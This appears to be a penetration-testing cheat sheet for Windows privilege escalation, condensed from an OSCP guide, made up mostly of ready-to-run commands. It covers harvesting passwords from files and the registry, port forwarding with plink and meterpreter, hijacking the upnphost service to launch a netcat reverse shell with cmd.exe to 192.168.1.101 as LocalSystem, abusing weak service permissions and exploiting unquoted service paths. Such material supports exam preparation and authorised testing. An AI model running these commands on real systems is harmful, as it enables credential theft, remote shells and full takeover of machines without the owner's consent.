# Windows Privilege Escalation

Condensed version of the checklist found on [Sushant747](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html). There is a plethora of ways to escalate privileges but I'm going to list the most common ways to escalate privileges (In my experience)

## Basic Enumeration/Kernel
```
# Basics
systeminfo
hostname

# Who am I?
whoami /all
echo %username%

# What users/localgroups are on the machine?
net users
net localgroups

# More info about a specific user. Check if user has privileges.
net user user1

# View Domain Groups
net group /domain

# View Members of Domain Group
net group /domain <Group Name>

# Firewall
netsh firewall show state
netsh firewall show config

# Network
ipconfig /all
route print
arp -A

# How well patched is the system?
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

## Passwords
### Search
```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
```

### In files
Common files (might be base-64 encoded)
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```

### In registry
```
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## Inside service
Find any service that is running on the machine, that you can't access from the outside (compare with nmap scan)
```
netstat -ano
```
Look for **LISTENING/LISTEN**. If you find something, try port forwarding to access it.
```cmd
# Port forward using plink
plink.exe -l {USER} -pw {PASSWORD} 192.168.0.101 -R 8080:127.0.0.1:8080

# Port forward using meterpreter
portfwd add -l <attacker port> -p <victim port> -r <victim ip>
portfwd add -l 3306 -p 3306 -r 192.168.1.101
```
### IP Addresses
**0.0.0.0** = All interfaces (World accessible)
**127.0.0.1** = Only local connections allowed (from the machine itself)
**192.168.X.X** = Anyone in the network can connect

## Scheduled Tasks
AKA Cronjobs in Linux
```
schtasks /query /fo LIST /v
```

## Change UPNp binary
```cmd
sc config upnphost binpath= "C:\Inetpub\nc.exe 192.168.1.101 6666 -e c:\Windows\system32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc config upnphost depend= ""
```

## Weak Service Permissions
### WMCI
```cmd
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt

for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
```
### sc.exe
```cmd
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt

FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt

FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt

FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```
```cmd
cacls "C:\path\to\file.exe"
```
#### Weaknesses
```
C:\path\to\file.exe 
BUILTIN\Users:F
BUILTIN\Power Users:C 
BUILTIN\Administrators:F 
NT AUTHORITY\SYSTEM:F
```
(F) and (C) rights indicate that group/user has write access

#### Restarting a service
```
wmic service NAMEOFSERVICE call startservice

or

net stop [service name] && net start [service name]
```

## Unquoted Service Paths
### Discover vulnerable services
```
# Using WMIC
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """

# Using sc
sc query
sc qc service name

# Look for Binary_path_name and see if it is unquoted.
```
If there's a space in the path without quotes, it's vulnerable

### Exploit
If binary is:
```
c:\Program Files\something\winamp.exe
```
Replace with:
```
c:\exploit.exe
```

## Vulnerable Drivers
```
# List all drivers
driverquery
```